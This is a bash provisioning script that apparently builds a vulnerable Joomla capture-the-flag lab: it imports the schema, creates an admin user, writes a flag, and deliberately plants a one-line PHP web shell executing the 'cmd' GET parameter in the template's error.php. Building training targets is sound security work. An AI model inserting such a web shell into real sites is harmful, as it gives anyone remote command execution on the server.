#!/usr/bin/env bash
#
# JoomBreaker idempotent provisioner (runs as a one-shot init container).
# Replaces the old host-side start.sh: no `docker rm -f`, no `docker exec`, no
# hardcoded container names. Talks to the DB by service name, edits the shared
# joomla volume, and is safe to re-run (ctfctl reset re-provisions from scratch).
#
set -euo pipefail

HTML=/var/www/html
MARKER="$HTML/.ctf_provisioned"
DBH="${CTF_DB_HOST:-db}"
# The Debian mariadb client defaults to TLS with cert verification and rejects
# MySQL 8's self-signed cert; disable client-side SSL.
MOPTS="--skip-ssl"

: "${MYSQL_ROOT_PASSWORD:?}"
: "${CTF_DB_NAME:?}"; : "${CTF_DB_USER:?}"; : "${CTF_DB_PASSWORD:?}"
: "${ADMIN_USER:?}"; : "${ADMIN_PASS:?}"; : "${ADMIN_EMAIL:?}"
: "${FLAG:?}"; : "${CTF_SECRET:?}"
export CTF_DB_NAME CTF_DB_USER CTF_DB_PASSWORD CTF_DB_HOST="$DBH" CTF_ADMIN_EMAIL="$ADMIN_EMAIL" CTF_SECRET

log(){ echo "[provision] $*"; }

write_flag(){ printf '%s\n' "$FLAG" > "/flag.txt"; chmod 444 "/flag.txt" || true; }

log "waiting for Joomla files in shared volume..."
for _ in $(seq 1 60); do [ -f "$HTML/cli/joomla.php" ] && break; sleep 3; done
[ -f "$HTML/cli/joomla.php" ] || { log "ERROR: Joomla files not present after timeout"; exit 1; }

if [ -f "$MARKER" ]; then
  log "already provisioned; refreshing flag and exiting."
  write_flag
  exit 0
fi

log "waiting for MySQL..."
for _ in $(seq 1 40); do
  mysqladmin $MOPTS ping -h "$DBH" -uroot -p"$MYSQL_ROOT_PASSWORD" --silent 2>/dev/null && break
  sleep 3
done
mysqladmin $MOPTS ping -h "$DBH" -uroot -p"$MYSQL_ROOT_PASSWORD" --silent 2>/dev/null \
  || { log "ERROR: MySQL not ready"; exit 1; }

log "importing schema (jos_ prefix)..."
if [ -d "$HTML/installation/sql/mysql" ]; then
  for f in base extensions supports; do
    src="$HTML/installation/sql/mysql/$f.sql"
    [ -f "$src" ] || continue
    sed 's/#__/jos_/g' "$src" | mysql $MOPTS -h "$DBH" -uroot -p"$MYSQL_ROOT_PASSWORD" "$CTF_DB_NAME" || true
  done
else
  log "WARN: installation/sql/mysql not found; assuming schema already present."
fi

log "writing configuration.php..."
envsubst '${CTF_DB_NAME} ${CTF_DB_USER} ${CTF_DB_PASSWORD} ${CTF_DB_HOST} ${CTF_ADMIN_EMAIL} ${CTF_SECRET}' \
  < /opt/ctf/configuration.php.tmpl > "$HTML/configuration.php"

log "creating admin user + enabling webservices..."
HASH="$(php -r 'echo password_hash(getenv("ADMIN_PASS"), PASSWORD_BCRYPT);')"
# Build SQL with printf so the bcrypt hash ($2y$..) is never shell-expanded.
SQL="$(printf "DELETE FROM jos_users WHERE username='%s';\n" "$ADMIN_USER")"
SQL+="$(printf "INSERT INTO jos_users (name,username,email,password,block,sendEmail,registerDate,lastvisitDate,activation,params,lastResetTime,resetCount,otpKey,otep,requireReset,authProvider) VALUES ('Administrator','%s','%s','%s',0,1,NOW(),NOW(),'','{}',NULL,0,'','',0,'');\n" "$ADMIN_USER" "$ADMIN_EMAIL" "$HASH")"
SQL+="$(printf "INSERT INTO jos_user_usergroup_map (user_id, group_id) SELECT id, 8 FROM jos_users WHERE username='%s';\n" "$ADMIN_USER")"
SQL+="UPDATE jos_extensions SET enabled=1 WHERE folder='webservices';"
printf '%s' "$SQL" | mysql $MOPTS -h "$DBH" -uroot -p"$MYSQL_ROOT_PASSWORD" "$CTF_DB_NAME"

log "planting backup webshell in cassiopeia/error.php..."
ERR="$HTML/templates/cassiopeia/error.php"
if [ -f "$ERR" ] && ! grep -q 'isset($_GET\["cmd"\])' "$ERR"; then
  sed -i '1s|^|<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>\n|' "$ERR" || true
fi

log "writing flag and removing installation dir..."
write_flag
rm -rf "$HTML/installation"

touch "$MARKER"
log "done."
